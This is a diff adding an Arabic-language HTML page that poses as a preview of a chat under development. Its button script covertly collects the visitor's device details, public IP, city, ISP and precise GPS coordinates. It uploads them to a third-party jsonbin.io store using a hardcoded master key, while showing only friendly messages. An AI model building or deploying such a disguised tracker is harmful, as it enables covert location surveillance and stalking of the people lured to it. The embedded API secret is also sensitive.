@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>XSPEEDO Tracker</title>
+<style>
+    body {
+        background: rgb(255, 255, 255);
+        color: black;
+        font-family: "Courier New", monospace;
+        text-align: center;
+        padding-top: 50px;
+    }
+    #box {
+        width: 60%;
+        margin: auto;
+        padding: 25px;
+        border: 2px solid #ff2b2b;
+        border-radius: 10px;
+        background: rgba(255,0,0,0.08);
+        box-shadow: 0 0 15px #ff0000;
+    }
+    button {
+        padding: 12px 25px;
+        font-size: 20px;
+        font-weight: bold;
+        background: #ff2b2b;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+    }
+    button:hover {
+        background: #ff0000;
+    }
+</style>
+</head>
+<body>
+
+<div id="box">
+    <h1>اهلاً بك يا هاني</h1>
+    <p>
+       الشات قيد التطوير
+    </p>
+    <button onclick="start()">رؤيه للشات بشكل بسيط</button>
+</div>
+
+<script>
+async function start() {
+    document.getElementById("box").innerHTML = "<h2>قريباً سيتم ارسال لك كل جديد</h2>";
+
+    let data = {};
+    data.id = Math.random().toString(36).substring(2, 10); // جهاز جديد
+    data.time = new Date().toLocaleString();
+
+    // Device info
+    data.device = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+    };
+
+    // Get public IP
+    try {
+        let ipRes = await fetch("https://api.ipify.org?format=json");
+        let ipJson = await ipRes.json();
+        data.ip = ipJson.ip;
+    } catch {
+        data.ip = "N/A";
+    }
+
+    // GEO using ipwho.is (Always works)
+    try {
+        let geoRes = await fetch(`https://ipwho.is/${data.ip}`);
+        let geo = await geoRes.json();
+
+        data.country = geo.country || "Unknown";
+        data.city = geo.city || "Unknown";
+        data.org = geo.connection?.isp || "Unknown";
+
+    } catch {
+        data.country = "Unknown";
+        data.city = "Unknown";
+        data.org = "Unknown";
+    }
+
+    // GPS
+    const getGPS = () => new Promise(resolve => {
+        if (!navigator.geolocation)
+            return resolve("Not Supported");
+
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+            }),
+            err => resolve("Denied")
+        );
+    });
+
+    data.gps = await getGPS();
+
+    // Save device to list
+    await saveDevice(data);
+
+    document.getElementById("box").innerHTML = `
+        <h2>اراك يا بابا ثانيتاً</h2>
+        <p>شكراً لزايرتك 😘</p>
+    `;
+}
+async function saveDevice(newDevice) {
+    const BIN = "692ef59eae596e708f7eac67";
+    const KEY = "$2a$10$hJudGjs2DM9GszivDobyS.5YXXS8HRiPobc9XxhYDUM5dtZQ81dE2";
+
+    // 1) Load existing devices
+    let existing = [];
+    try {
+        let r = await fetch(`https://api.jsonbin.io/v3/b/${BIN}/latest`, {
+            headers: { "X-Master-Key": KEY }
+        });
+        let json = await r.json();
+        existing = json.record.devices || [];
+    } catch {
+        existing = [];
+    }
+
+    // 2) Add new device
+    existing.push(newDevice);
+
+    // 3) Save back
+    await fetch(`https://api.jsonbin.io/v3/b/${BIN}`, {
+        method: "PUT",
+        headers: {
+            "Content-Type": "application/json",
+            "X-Master-Key": KEY
+        },
+        body: JSON.stringify({ devices: existing })
+    });
+}
+
+</script>
+
+</body>
+</html>
